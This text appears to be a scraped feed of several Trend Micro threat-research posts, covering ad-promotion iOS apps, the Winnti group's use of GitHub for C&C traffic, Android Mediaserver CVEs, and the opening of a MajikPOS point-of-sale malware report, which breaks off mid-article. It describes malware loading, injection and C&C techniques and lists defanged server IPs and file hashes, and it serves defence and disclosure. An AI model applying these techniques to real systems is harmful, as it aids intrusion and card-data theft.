<p>This particular app was not the only problematic app we saw in the App Store. We found another one called “爱应用助手”, which translates to “LoveApp”. This is designed to be used to promote apps that are already in the App Store. This, in effect, bypasses either Apple’s arrangement of apps in searches and the paid <a href=""http://searchads.apple.com/"">Search Ads</a> option. This app makes its money from developers who want to promote their wares without going through Apple&#8217;s promotion service.</p>
<p>iOS includes various APIs that are meant to allow a developer to easily display their app&#8217;s page. LoveApp uses this to easily direct users from its own listings to the App Store listing of the promoted apps:</p>
<p align=""center""><img src=""http://blog.trendmicro.com/trendlabs-security-intelligence/files/2017/03/iosthirdparty20.png"" /></p>
<p style=""text-align: center;""><em>Figure 20. Installation of promoted app</em></p>
<p>The &#8220;LoveApp&#8221; is in the background, with the App Store window of the promoted app in the foreground. The code that does this can be seen here:</p>
<p align=""center""><a href=""http://blog.trendmicro.com/trendlabs-security-intelligence/files/2017/03/iosthirdparty22.png""><img src=""http://blog.trendmicro.com/trendlabs-security-intelligence/files/2017/03/iosthirdparty22tb.png"" /></a></p>
<p style=""text-align: center;""><em>Figure 21. Code for opening the App Store window</em> (Click to enlarge)</p>
<p>From a privacy perspective, LoveApp has multiple issues. Firstly, during installation, it uploads some user attributes to their servers, including their advertising identifier (idfa). This is primarily used to count the number of downloads.</p>
<p align=""center""><img src=""http://blog.trendmicro.com/trendlabs-security-intelligence/files/2017/03/iosthirdparty21.png"" /></p>
<p style=""text-align: center;""><em>Figure 22. User attributes uploaded</em></p>
<p>In addition, it also uses a third-party SDK called <em>TalkingData</em>. The app uses it to gather information about the user&#8217;s behavior:</p>
<p align=""center""><img src=""http://blog.trendmicro.com/trendlabs-security-intelligence/files/2017/03/iosthirdparty23.png"" /></p>
<p style=""text-align: center;""><em>Figure 23. TalkingData call</em></p>
<p>This SDK, however, has many aggressive API calls. Its capabilities include acquiring various parts of the user&#8217;s system information (including the Wi-Fi network name, running processes, and IP address). If the user&#8217;s phone has been jailbroken, the SDK can also gather the user&#8217;s Apple ID and installed apps. This is enough for us to consider it a potentially unwanted application.</p>
<p align=""center""><a href=""http://blog.trendmicro.com/trendlabs-security-intelligence/files/2017/03/iosthirdparty24.png""><img src=""http://blog.trendmicro.com/trendlabs-security-intelligence/files/2017/03/iosthirdparty24tb.png"" /></a></p>
<p style=""text-align: center;""><em>Figure 24. Other aggressive API calls (Click to enlarge)</em></p>
<p><em><strong>Risks and Mitigation</strong></em></p>
<p>We recommend that users be careful about downloading apps from third-party app stores. Apple can&#8217;t endorse the safety of any of the apps delivered via third-party stores, and such is the case here: users are still exposing themselves to various security threats (including malware and other unwanted apps). Organizations should put in place policies to reduce the risk from these malicious apps, such as blocking unapproved app stores and safeguarding personal devices.</p>
<p>We notified Apple about the presence of both of these apps in the iOS App Store prior to publication of this blog post.</p>
<p>The following files are related to this incident:</p>
<table border=""1"">
<tbody>
<tr>
<td>SHA256 hash</td>
<td>Detection name</td>
</tr>
<tr>
<td>212015dbae6e36c703c513f762413ffe<br />
fe5ad58720c22abb696bca94f3b6c14b</td>
<td>IOS_FakeAppStore.A</td>
</tr>
<tr>
<td>adcfa3d540f78297dde3dcbf0191271d<br />
8592911d71703ce853b6de622421c1fb</td>
<td>IOS_JailBreakTool.A</td>
</tr>
<tr>
<td>c75777079d72c43516adc7bdee4db447<br />
f22bbd25af26c08bcee42f885a820866</td>
<td>IOS_FakeAppStore.A</td>
</tr>
</tbody>
</table>
<p>Post from: <a href=""http://blog.trendmicro.com/trendlabs-security-intelligence/"">Trendlabs Security Intelligence Blog - by Trend Micro</a></p>
<p><a href=""http://blog.trendmicro.com/trendlabs-security-intelligence/third-party-app-stores-delivered-via-ios-app-store/"" rel=""nofollow"">Third-Party App Stores Delivered via the iOS App Store</a></p>
<div class=""feedflare"">
<a href=""http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=l0HV7HRCNH4:pIvAFCe09mw:yIl2AUoC8zA""><img border=""0"" src=""http://feeds.feedburner.com/~ff/Anti-MalwareBlog?d=yIl2AUoC8zA"" /></a> <a href=""http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=l0HV7HRCNH4:pIvAFCe09mw:F7zBnMyn0Lo""><img border=""0"" src=""http://feeds.feedburner.com/~ff/Anti-MalwareBlog?i=l0HV7HRCNH4:pIvAFCe09mw:F7zBnMyn0Lo"" /></a> <a href=""http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=l0HV7HRCNH4:pIvAFCe09mw:qj6IDK7rITs""><img border=""0"" src=""http://feeds.feedburner.com/~ff/Anti-MalwareBlog?d=qj6IDK7rITs"" /></a> <a href=""http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=l0HV7HRCNH4:pIvAFCe09mw:V_sGLiPBpWU""><img border=""0"" src=""http://feeds.feedburner.com/~ff/Anti-MalwareBlog?i=l0HV7HRCNH4:pIvAFCe09mw:V_sGLiPBpWU"" /></a> <a href=""http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=l0HV7HRCNH4:pIvAFCe09mw:l6gmwiTKsz0""><img border=""0"" src=""http://feeds.feedburner.com/~ff/Anti-MalwareBlog?d=l6gmwiTKsz0"" /></a> <a href=""http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=l0HV7HRCNH4:pIvAFCe09mw:gIN9vFwOqvQ""><img border=""0"" src=""http://feeds.feedburner.com/~ff/Anti-MalwareBlog?i=l0HV7HRCNH4:pIvAFCe09mw:gIN9vFwOqvQ"" /></a> <a href=""http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=l0HV7HRCNH4:pIvAFCe09mw:TzevzKxY174""><img border=""0"" src=""http://feeds.feedburner.com/~ff/Anti-MalwareBlog?d=TzevzKxY174"" /></a>
</div><img alt="""" height=""1"" src=""http://feeds.feedburner.com/~r/Anti-MalwareBlog/~4/l0HV7HRCNH4"" width=""1"" />",http://feeds.trendmicro.com/~r/Anti-MalwareBlog/~3/l0HV7HRCNH4/
Winnti Abuses GitHub for C&C Communications,"<p><strong><em>With additional analysis from Cyber Safety Solutions Team</em></strong></p>
<p>Developers constantly need to modify and rework their source codes when releasing new versions of applications or coding projects they create and maintain. This is what makes GitHub—an online repository hosting service that provides version control management—popular. In many ways, it’s like a social networking site for programmers and developers, one that provides a valuable platform for code management, sharing, collaboration, and integration.</p>
<p>GitHub is no stranger to misuse, however. Open-source <a href=""http://blog.trendmicro.com/trendlabs-security-intelligence/new-open-source-ransomwar-based-on-hidden-tear-and-eda2-may-target-businesses/"">ransomware projects EDA2 and Hidden Tear</a>—supposedly created for educational purposes—were hosted on GitHub, and have since spawned various offshoots that have been found targeting enterprises. Tools that <a href=""http://blog.trendmicro.com/trendlabs-security-intelligence/another-challenge-iot-open-backdoors/"">exploited vulnerabilities in Internet of Things (IoT) devices</a> were also made available on GitHub. Even the <a href=""http://blog.trendmicro.com/trendlabs-security-intelligence/not-limitless-trend-micro-ftr-assists-arrest-limitless-author/"">Limitless Keylogger</a>, which was used in targeted attacks, was linked to a GitHub project.</p>
<p>Recently, the Winnti group, a threat actor with a past of traditional cybercrime -particularly with financial fraud, has been seen abusing GitHub by turning it into a conduit for the command and control (C&amp;C) communications of their seemingly new backdoor (detected by Trend Micro as BKDR64_WINNTI.ONM).</p>
<p>Our research also showed that the group still uses some of the infamous PlugX malware variants—a staple in Winnti’s arsenal—to handle targeted attack operations via the GitHub account we identified.</p>
<p><em><strong>Malware Analysis</strong></em></p>
<p>The malware we analyzed is separated in two files: a loader, and the payload.</p>
<p>The loader, named <em>loadperf.dll</em>, is a modified version of its legitimate, similarly named counterpart—a Microsoft file which helps manipulate the performance registry. An extra component has been added to its sections. It copies itself on <em>%WINDIR%\system32\wbem\</em> and replaces the original DLL. It leverages the WMI performance adapter service (wmiAPSrv), a legitimate file in Windows that collects information related to system performance, to import the loader via <em>services.exe</em>. The system also imports all related DLL files and includes the payload “loadoerf.ini”. The infection chain includes an additional (albeit empty) function imported from <em>loadoerf.ini</em>, <em>gzwrite64</em>, which works as a fake Application Program Interface (API) that serves as the payload’s entry point. Although <em>gzwrite64</em> is imported by <em>loadperf.dll</em>, the payload’s main function is actually located in the <em>DLLMain</em> of “loadoerf.ini”.</p>
<p align=""center""><a href=""http://blog.trendmicro.com/trendlabs-security-intelligence/files/2017/03/winnti-github-1.png""><img src=""http://blog.trendmicro.com/trendlabs-security-intelligence/files/2017/03/winnti-github-1.png"" width=""590"" /></a><br />
<em>Figure 1: Extra section .idata added to the original loadperf.dll</em></p>
<p align=""center""><a href=""http://blog.trendmicro.com/trendlabs-security-intelligence/files/2017/03/winnti-github-2.png""><img src=""http://blog.trendmicro.com/trendlabs-security-intelligence/files/2017/03/winnti-github-2.png"" width=""540"" /></a><br />
<em>Figure 2: Extra imported function gzwrite64</em></p>
<p>The payload is a file named <em>loadoerf.ini</em> that contains decryption, run, and code injection functions. When it is loaded by the system, <em>DLLMain</em> decrypts the payload via <em>CryptUnprotectData</em>. Since the function highly depends on the actual “machine ID”, decryption on another machine that isn’t the original infected host is not viable, making malware analysis more difficult.</p>
<p align=""center""><a href=""http://blog.trendmicro.com/trendlabs-security-intelligence/files/2017/03/winnti-github-3.png""><img src=""http://blog.trendmicro.com/trendlabs-security-intelligence/files/2017/03/winnti-github-3.png"" width=""590"" /></a><br />
<em>Figure 3: Part of the decryption function used in the payload</em></p>
<p>After decryption, partial code is run on the machine, which is then injected to <em>svchost.exe</em> (a key Windows component); payload is then loaded into memory.</p>
<p align=""center""><a href=""http://blog.trendmicro.com/trendlabs-security-intelligence/files/2017/03/winnti-github-4.png""><img src=""http://blog.trendmicro.com/trendlabs-security-intelligence/files/2017/03/winnti-github-4.png"" width=""590"" /></a><br />
<em>Figure 4: Execution/infection flow of loadoerf.ini</em></p>
<p>How is GitHub abused? Upon successful infection, the malware starts communicating with an HTML page from a repository stored in a GitHub project.</p>
<p align=""center""><a href=""http://blog.trendmicro.com/trendlabs-security-intelligence/files/2017/03/winnti-github-5.png""><img src=""http://blog.trendmicro.com/trendlabs-security-intelligence/files/2017/03/winnti-github-5.png"" width=""590"" /></a><br />
<em>Figure 5: GitHub account hosting an HTML page used for C&amp;C communication</em></p>
<p>Any malware threat analyst will immediately recognize Line 3 in the image above as a potential PlugX-encrypted line. The beginning and end markers, DZKS and DZJS, are <a href=""http://blog.airbuscybersecurity.com/post/2014/01/plugx-some-uncovered-points.html"" target=""_blank"">typical</a> in PlugX. A closer look, however, shows that the decryption algorithm is different from PlugX. In this case, decrypting them reveals references to its actual command and control (C&amp;C) server: an IP address and a port number the malware will connect to.</p>
<p>Winnti currently uses different encryption algorithms to store those C&amp;C references in the files they stored on Github. Among them is an algorithm utilized by PlugX. In fact, we found references to PlugX in the C&amp;C strings we analyzed, indicating that the group may also be using the same backdoor in this particular campaign. Although we were unable to find a PlugX sample through that particular GitHub, we surmise some PlugX variants in the wild use this GitHub repository to get their C&amp;C information.</p>
<p>Nearly all the other algorithms used in this GitHub campaign are derived from the original PlugX algorithm:</p>
<ul>
<li>PlugX style + shift string + Base64</li>
<li>PlugX style + shift string + Base64 + XOR</li>
<li>PlugX style + Base64 + XOR</li>
</ul>
<p>One algorithm is also built in mark strings + shift string + Base64 encoding.</p>
<p><em><strong>Following Winnti&#8217;s Trails</strong></em></p>
<p>The GitHub account used by the cybercriminals was created in May 2016. It created one legitimate project/repository (<em>mobile-phone-project</em>) in June 2016, derived from another generic GitHub page.</p>
<p>The repository for Winnti’s C&amp;C communications was created on August 2016. We surmise that the GitHub account was not compromised, and instead created by Winnti. By March 2017, the repository already contained 14 different HTML pages created at various times.</p>
<p><em><strong>Timeline of the Campaign</strong></em></p>
<p>We mapped Winnti’s activities for this campaign by analyzing the dates exposed in GitHub. For each file, GitHub stores first-and-last commit timestamps; these enabled us to create a timeline of the first use of the group’s many C&amp;C servers.</p>
<p>We monitored the period during which IP addresses were found connecting to Winnti’s C&amp;C servers and found that they started their operations in the afternoon up to late evening. The timetable resembles traditional working hours for cybercriminals, compared to those with less structure who prefer starting their days late, but also working until very late hours. In fact, we only observed one instance of activity during the weekend, where a new HTML file was created.</p>
<p>The earliest activity we tracked on the GitHub account was from August 17, 2016, with the most recent in March 12, 2017.</p>
<p>Here is a timeline of when the C&amp;C server’s IP addresses were first used, based on our monitoring:</p>
<p align=""center""><a href=""http://blog.trendmicro.com/trendlabs-security-intelligence/files/2017/03/winnti-github-6.png""><img src=""http://blog.trendmicro.com/trendlabs-security-intelligence/files/2017/03/winnti-github-6.png"" width=""590"" /></a><br />
<em>Figure 6: Timeline of the C&amp;C server’s IP addresses</em></p>
<p><em><strong>C&amp;C Servers</strong></em></p>
<p>The GitHub account used by Winnti shows 12 different IP addresses, with various port numbers used for them. All communication to these C&amp;C servers are done on three different port numbers: 53 (DNS), 80 (HTTP), and 443 (HTTPS). These are typical techniques PlugX and Winnti malware variants use to communicate between compromised machines and their C&amp;C servers. Nearly all the C&amp;C servers are hosted in the U.S., while two are located in Japan.</p>
<table class=""centerTable"" style=""width: 400px; margin: 0px auto; text-align: left; line-height: 15px;"">
<tbody>
<tr>
<td style=""text-align: center;"" width=""200""><span style=""color: #ff0000;""><strong><span style=""text-align: center; line-height: 15px;"">C&amp;C Server&#8217;s IP Address</span></strong></span></td>
<td style=""text-align: center;"" width=""80""><span style=""color: #ff0000;""><strong><span style=""text-align: center;"">Port Number</span></strong></span></td>
</tr>
<tr>
<td width=""130"">160[.]16[.]243[.]129</td>
<td width=""130"">443 (HTTPS)</td>
</tr>
<tr>
<td width=""130"">160[.]16[.]243[.]129</td>
<td width=""130"">53 (DNS)</td>
</tr>
<tr>
<td width=""130"">160[.]16[.]243[.]129</td>
<td width=""130"">80 (HTTP)</td>
</tr>
<tr>
<td width=""130"">174[.]139[.]203[.]18</td>
<td width=""130"">443 (HTTPS)</td>
</tr>
<tr>
<td width=""130"">174[.]139[.]203[.]18</td>
<td width=""130"">53 (DNS)</td>
</tr>
<tr>
<td width=""130"">174[.]139[.]203[.]20</td>
<td width=""130"">53 (DNS)</td>
</tr>
<tr>
<td width=""130"">174[.]139[.]203[.]22</td>
<td width=""130"">443 (HTTPS)</td>
</tr>
<tr>
<td width=""130"">174[.]139[.]203[.]22</td>
<td width=""130"">53 (DNS)</td>
</tr>
<tr>
<td width=""130"">174[.]139[.]203[.]27</td>
<td width=""130"">53 (DNS)</td>
</tr>
<tr>
<td width=""130"">174[.]139[.]203[.]34</td>
<td width=""130"">53 (DNS)</td>
</tr>
<tr>
<td width=""130"">174[.]139[.]62[.]58</td>
<td width=""130"">80 (HTTP)</td>
</tr>
<tr>
<td width=""130"">174[.]139[.]62[.]60</td>
<td width=""130"">443 (HTTPS)</td>
</tr>
<tr>
<td width=""130"">174[.]139[.]62[.]60</td>
<td width=""130"">53 (DNS)</td>
</tr>
<tr>
<td width=""130"">174[.]139[.]62[.]60</td>
<td width=""130"">80 (HTTP)</td>
</tr>
<tr>
<td width=""130"">174[.]139[.]62[.]61</td>
<td width=""130"">443 (HTTPS)</td>
</tr>
<tr>
<td width=""130"">61[.]195[.]98[.]245</td>
<td width=""130"">443 (HTTPS)</td>
</tr>
<tr>
<td width=""130"">61[.]195[.]98[.]245</td>
<td width=""130"">53 (DNS)</td>
</tr>
<tr>
<td width=""130"">61[.]195[.]98[.]245</td>
<td width=""130"">80 (HTTP)</td>
</tr>
<tr>
<td width=""130"">67[.]198[.]161[.]250</td>
<td width=""130"">443 (HTTPS)</td>
</tr>
<tr>
<td width=""130"">67[.]198[.]161[.]250</td>
<td width=""130"">53 (DNS)</td>
</tr>
<tr>
<td width=""130"">67[.]198[.]161[.]251</td>
<td width=""130"">443 (HTTPS)</td>
</tr>
<tr>
<td width=""130"">67[.]198[.]161[.]252</td>
<td width=""130"">443 (HTTPS)</td>
</tr>
</tbody>
</table>
<p style=""text-align: center;""><em>Figure 6: IP addresses used for C&amp;C communication, and the port numbers they use</em></p>
<p>We have privately disclosed our findings to GitHub prior to this publication and are proactively working with them about this threat.</p>
<p><em><strong>Conclusion</strong></em></p>
<p>Abusing popular platforms like GitHub enables threat actors like Winnti to maintain network persistence between compromised computers and their servers, while staying under the radar. Although Winnti may still be employing traditional malware, its use of a relatively unique tactic to stay ahead of the threat landscape’s curve reflects the <a href=""https://www.trendmicro.com/vinfo/us/security/research-and-analysis/predictions/2017"" target=""_blank"">increased sophistication that threat actors are projected to employ</a>.</p>
<p><strong><em>Related Hashes (SHA256) detected as BKDR64_WINNTI.ONM:</em></strong><br />
06b077e31a6f339c4f3b1f61ba9a6a6ba827afe52ed5bed6a6bf56bf18a279ba — <em>cryptbase.dll</em><br />
1e63a7186886deea6c4e5c2a329eab76a60be3a65bca1ba9ed6e71f9a46b7e9d – <em>loadperf.dll</em><br />
7c37ebb96c54d5d8ea232951ccf56cb1d029facdd6b730f80ca2ad566f6c5d9b – <em>loadoerf.ini</em><br />
9d04ef8708cf030b9688bf3e8287c1790023a76374e43bd332178e212420f9fb — <em>wbemcomn.ini</em><br />
b1a0d0508ee932bbf91625330d2136f33344ed70cb25f7e64be0620d32c4b9e2 — <em>cryptbase.ini</em><br />
e5273b72c853f12b77a11e9c08ae6432fabbb32238ac487af2fb959a6cc26089 — <em>wbemcomn.dll</em></p>
<p>Post from: <a href=""http://blog.trendmicro.com/trendlabs-security-intelligence/"">Trendlabs Security Intelligence Blog - by Trend Micro</a></p>
<p><a href=""http://blog.trendmicro.com/trendlabs-security-intelligence/winnti-abuses-github/"" rel=""nofollow"">Winnti Abuses GitHub for C&amp;C Communications</a></p>
<div class=""feedflare"">
<a href=""http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=mBCFR1k6aeY:1YPtTIaMhTA:yIl2AUoC8zA""><img border=""0"" src=""http://feeds.feedburner.com/~ff/Anti-MalwareBlog?d=yIl2AUoC8zA"" /></a> <a href=""http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=mBCFR1k6aeY:1YPtTIaMhTA:F7zBnMyn0Lo""><img border=""0"" src=""http://feeds.feedburner.com/~ff/Anti-MalwareBlog?i=mBCFR1k6aeY:1YPtTIaMhTA:F7zBnMyn0Lo"" /></a> <a href=""http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=mBCFR1k6aeY:1YPtTIaMhTA:qj6IDK7rITs""><img border=""0"" src=""http://feeds.feedburner.com/~ff/Anti-MalwareBlog?d=qj6IDK7rITs"" /></a> <a href=""http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=mBCFR1k6aeY:1YPtTIaMhTA:V_sGLiPBpWU""><img border=""0"" src=""http://feeds.feedburner.com/~ff/Anti-MalwareBlog?i=mBCFR1k6aeY:1YPtTIaMhTA:V_sGLiPBpWU"" /></a> <a href=""http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=mBCFR1k6aeY:1YPtTIaMhTA:l6gmwiTKsz0""><img border=""0"" src=""http://feeds.feedburner.com/~ff/Anti-MalwareBlog?d=l6gmwiTKsz0"" /></a> <a href=""http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=mBCFR1k6aeY:1YPtTIaMhTA:gIN9vFwOqvQ""><img border=""0"" src=""http://feeds.feedburner.com/~ff/Anti-MalwareBlog?i=mBCFR1k6aeY:1YPtTIaMhTA:gIN9vFwOqvQ"" /></a> <a href=""http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=mBCFR1k6aeY:1YPtTIaMhTA:TzevzKxY174""><img border=""0"" src=""http://feeds.feedburner.com/~ff/Anti-MalwareBlog?d=TzevzKxY174"" /></a>
</div><img alt="""" height=""1"" src=""http://feeds.feedburner.com/~r/Anti-MalwareBlog/~4/mBCFR1k6aeY"" width=""1"" />",http://feeds.trendmicro.com/~r/Anti-MalwareBlog/~3/mBCFR1k6aeY/
Mediaserver Vulnerabilities Highlight Android’s March Security Bulletin,"<p>The Android <a href=""https://source.android.com/security/bulletin/2017-03-01.html"">security bulletin for March</a>, published last March 6, contains 15 vulnerabilities that we discovered and privately disclosed to Google. Like <a href=""http://blog.trendmicro.com/trendlabs-security-intelligence/revisiting-cve-2015-3823-mediaserver-bug-leads-to-heap-overflow-too/http:/blog.trendmicro.com/trendlabs-security-intelligence/revisiting-cve-2015-3823-mediaserver-bug-leads-to-heap-overflow-too/"">some of our previous discoveries</a>, many of these new vulnerabilities concern Mediaserver, which is the component responsible for scanning and indexing all available media files in the Android operating system.</p>
<p>Google encourages owners of Android-based devices to avoid any potential issues by accepting their over-the-air (OTA) update which address these vulnerabilities. However, it should also be noted that Google can only directly update devices that are using native Android operating systems. As such, users who are unable to directly receive these updates may need to confirm with their service providers or device manufacturers to see if an update is available.</p>
<p><strong><em>Vulnerability details</em></strong></p>
<p>Of the 15 vulnerabilities, eight were <a href=""https://source.android.com/security/overview/updates-resources.html#severity"">rated Critical</a>: An attacker exploiting these vulnerabilities can use specially crafted files – specifically H.264 and H.265 videos- to cause memory corruption during file processing. In addition, these new vulnerabilities can potentially allow attackers to run remote code executions via Mediaserver processes. However, unlike the earlier vulnerabilities, <a href=""http://blog.trendmicro.com/trendlabs-security-intelligence/revisiting-cve-2015-3823-mediaserver-bug-leads-to-heap-overflow-too/http:/blog.trendmicro.com/trendlabs-security-intelligence/revisiting-cve-2015-3823-mediaserver-bug-leads-to-heap-overflow-too/"">CVE-2015-3823</a> and <a href=""https://www.trendmicro.com/vinfo/us/threat-encyclopedia/vulnerability/6152/stagefright-android-vulnerability-cve20153824"">CVE-2015-3824</a> which were caused primarily by bad media format parsing, the newest batch is caused by issues surrounding the media decoder codec.</p>
<p>In addition to these, we also discovered additional vulnerabilities which were rated by Google as High severity. These particularly vulnerabilities involve a denial of service attack, in which the perpetrator can use crafted media files to trigger an indefinite Mediaserver loop. This causes the target device to become extremely sluggish and can even cause random reboots. While the denial of service itself is easy to trigger, Android has enhanced the security features of Mediaserver making it more difficult to compromise the device itself.</p>
<p>We also reported a third Mediaserver vulnerability, which was rated by Google as of Moderate severity. CVE-2017-0495 is an information disclosure vulnerability which fetches data from the Mediaserver memory. The main purpose of this vulnerability is to get other vulnerabilities, particularly remote code executions, working. A Moderate priority information disclosure vulnerability dealing with AOSP Messaging and Android Messages rounds up our reported discoveries for March. Cybercriminals exploiting CVE-2017-0494 can use specially crafted GIF files to gain access to potentially sensitive data in the Messaging app beyond their normal permission levels.</p>
<p><strong><em>Best Practices and Trend Micro Solutions</em></strong></p>
<p>Many of these vulnerabilities require a specially crafted file before they can be exploited, thus users should be aware of the websites they visit – particularly online streaming video sites that can trigger these exploits. In addition, these vulnerabilities can be nipped in the bud by regularly applying the latest patches from Google.</p>
<p>End users can protect their mobile devices by downloading <a href=""https://www.trendmicro.com/en_us/forHome/products/mobile-security.html"">Trend Micro Mobile Security (TMMS)</a>, which can detect threats that could be used to exploit vulnerabilities.</p>
<p><em>We disclosed the following vulnerabilities c/o Veo Zhang and Seven Shen:</em></p>
<table>
<tbody>
<tr>
<td width=""200"">
<p style=""text-align: center;"">Remote Code Execution Vulnerability (Critical)</p>
</td>
<td width=""200"">
<p style=""text-align: center;"">Denial of Service Vulnerability in Mediaserver (High)</p>
</td>
<td width=""200"">
<p style=""text-align: center;"">Information Disclosure Vulnerability in AOSP Messaging (Moderate)</p>
</td>
<td width=""200"">
<p style=""text-align: center;"">Information Disclosure Vulnerability in Mediaserver (Moderate)</p>
</td>
</tr>
<tr>
<td width=""200"">
<ul>
<li>CVE-2017-0466</li>
<li>CVE-2017-0467</li>
<li>CVE-2017-0468</li>
<li>CVE-2017-0469</li>
<li>CVE-2017-0470</li>
<li>CVE-2017-0471</li>
<li>CVE-2017-0472</li>
<li>CVE-2017-0473</li>
</ul>
</td>
<td width=""200"">
<ul>
<li>CVE-2017-0482</li>
<li>CVE-2017-0484</li>
<li>CVE-2017-0485</li>
<li>CVE-2017-0486</li>
<li>CVE-2017-0487</li>
</ul>
</td>
<td width=""200"">
<ul>
<li>CVE-2017-0494</li>
</ul>
</td>
<td width=""200"">
<ul>
<li>CVE-2017-0495</li>
</ul>
</td>
</tr>
</tbody>
</table>
<p>Post from: <a href=""http://blog.trendmicro.com/trendlabs-security-intelligence/"">Trendlabs Security Intelligence Blog - by Trend Micro</a></p>
<p><a href=""http://blog.trendmicro.com/trendlabs-security-intelligence/mediaserver-vulnerabilities-highlight-androids-march-security-bulletin/"" rel=""nofollow"">Mediaserver Vulnerabilities Highlight Android’s March Security Bulletin</a></p>
<div class=""feedflare"">
<a href=""http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=pm9WK899pV4:-tSA-OPP6XY:yIl2AUoC8zA""><img border=""0"" src=""http://feeds.feedburner.com/~ff/Anti-MalwareBlog?d=yIl2AUoC8zA"" /></a> <a href=""http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=pm9WK899pV4:-tSA-OPP6XY:F7zBnMyn0Lo""><img border=""0"" src=""http://feeds.feedburner.com/~ff/Anti-MalwareBlog?i=pm9WK899pV4:-tSA-OPP6XY:F7zBnMyn0Lo"" /></a> <a href=""http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=pm9WK899pV4:-tSA-OPP6XY:qj6IDK7rITs""><img border=""0"" src=""http://feeds.feedburner.com/~ff/Anti-MalwareBlog?d=qj6IDK7rITs"" /></a> <a href=""http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=pm9WK899pV4:-tSA-OPP6XY:V_sGLiPBpWU""><img border=""0"" src=""http://feeds.feedburner.com/~ff/Anti-MalwareBlog?i=pm9WK899pV4:-tSA-OPP6XY:V_sGLiPBpWU"" /></a> <a href=""http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=pm9WK899pV4:-tSA-OPP6XY:l6gmwiTKsz0""><img border=""0"" src=""http://feeds.feedburner.com/~ff/Anti-MalwareBlog?d=l6gmwiTKsz0"" /></a> <a href=""http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=pm9WK899pV4:-tSA-OPP6XY:gIN9vFwOqvQ""><img border=""0"" src=""http://feeds.feedburner.com/~ff/Anti-MalwareBlog?i=pm9WK899pV4:-tSA-OPP6XY:gIN9vFwOqvQ"" /></a> <a href=""http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=pm9WK899pV4:-tSA-OPP6XY:TzevzKxY174""><img border=""0"" src=""http://feeds.feedburner.com/~ff/Anti-MalwareBlog?d=TzevzKxY174"" /></a>
</div><img alt="""" height=""1"" src=""http://feeds.feedburner.com/~r/Anti-MalwareBlog/~4/pm9WK899pV4"" width=""1"" />",http://feeds.trendmicro.com/~r/Anti-MalwareBlog/~3/pm9WK899pV4/
MajikPOS Combines PoS Malware and RATs to Pull Off its Malicious Tricks,"<p><strong><em>by Cyber Safety Solutions Team</em></strong></p>
<p>We’ve uncovered a new breed of <a href=""https://www.trendmicro.com/vinfo/us/security/definition/PoS-(point-of-sale)-malware"">point-of-sale (PoS) malware</a> currently affecting businesses across North America and Canada: MajikPOS (detected by Trend Micro as TSPY_MAJIKPOS.A). Like a lot of other PoS malware, MajikPOS is designed to steal information, but its modular approach in execution makes it distinct. We estimate that MajikPOS’s initial infection started around January 28, 2017.</p>
<p>While other PoS malware <a href=""http://blog.trendmicro.com/trendlabs-security-intelligence/fastpos-updates-in-time-for-retail-sale-season/"">FastPOS</a> (its updated version), <a href=""http://blog.trendmicro.com/trendlabs-security-intelligence/operation-black-atlas-part-2-tools-and-malware-used-and-how-to-detect-them/"">Gorynych</a> and <a href=""http://blog.trendmicro.com/trendlabs-security-intelligence/operation-black-atlas-endangers-in-store-card-payments-and-smbs-worldwide-switches-between-blackpos-and-other-tools/"">ModPOS</a> also feature multiple components with entirely different functions like keylogging, MajikPOS’s modular tack is different. MajikPOS needs only another component from the server to conduct its RAM scraping routine.</p>
<p>MajikPOS is named after its command and control (C&amp;C) panel that receives commands and sends exfiltrated data. MajikPOS’s operators use a combination of PoS malware and remote access Trojan (RAT) to attack their targets, to daunting effects. MajikPOS is a reflection of the <a href=""https://www.trendmicro.com/vinfo/us/security/research-and-analysis/predictions/2017"">increasing complexity that bad guys are predicted to employ</a> in their malware to neuter traditional defenses.</p>
<p><strong><em>Entry Point and Attack Chain</em></strong></p>
<p>Feedback from our <a href=""https://www.trendmicro.com/en_ca/business/technologies/smart-protection-network.html"">Smart Protection Network</a>™ enabled us to determine the methods the bad guys used to illicitly gain access to the victims’ endpoints. Among them are Virtual Network Computing (VNC) and Remote Desktop Protocol (RDP), poorly secured by easy-to-guess username and password combinations; and RATs previously installed in the system.</p>
<p>After fingerprinting the targets—ascertaining if VNC and RDP services exist and are accessible—attackers will attempt to gain access using generic credentials or via brute force. The common denominator in the MajikPOS compromises we’ve observed involving RATs is the timeline of their infection. The RATs were installed in the endpoints somewhere between August and November, 2016.</p>
<p>If the endpoint piques the malefactors’ interest, they use a combination of VNC, RDP, RAT access, command-line FTP (File Transfer Protocol), and sometimes a modified version of Ammyy Admin—a legitimate, commercially available remote administration tool—to install MajikPOS by directly downloading the files usually hosted on free file-hosting sites. In the case of Ammyy Admin, its file manager capability is used instead. The modified version is sometimes named <em>VNC_Server.exe</em> or <em>Remote.exe</em>.</p>
<p><strong><em>Configuration and C&amp;C Communication</em></strong></p>
<p>MajikPOS contacts its C&amp;C server to register the infected system. Once registered, the server then sends a “configuration” with three important entries that will be used in later steps.</p>
<p align=""center""><a href=""http://blog.trendmicro.com/trendlabs-security-intelligence/files/2017/03/majikpos-1.png""><img src=""http://blog.trendmicro.com/trendlabs-security-intelligence/files/2017/03/majikpos-1.png"" width=""590"" /></a><br />
<em>Figure 1: C&amp;C server responds with configuration details after registration</em></p>
<p>The C&amp;C panel in these servers is called “Magic Panel”, as shown below:</p>
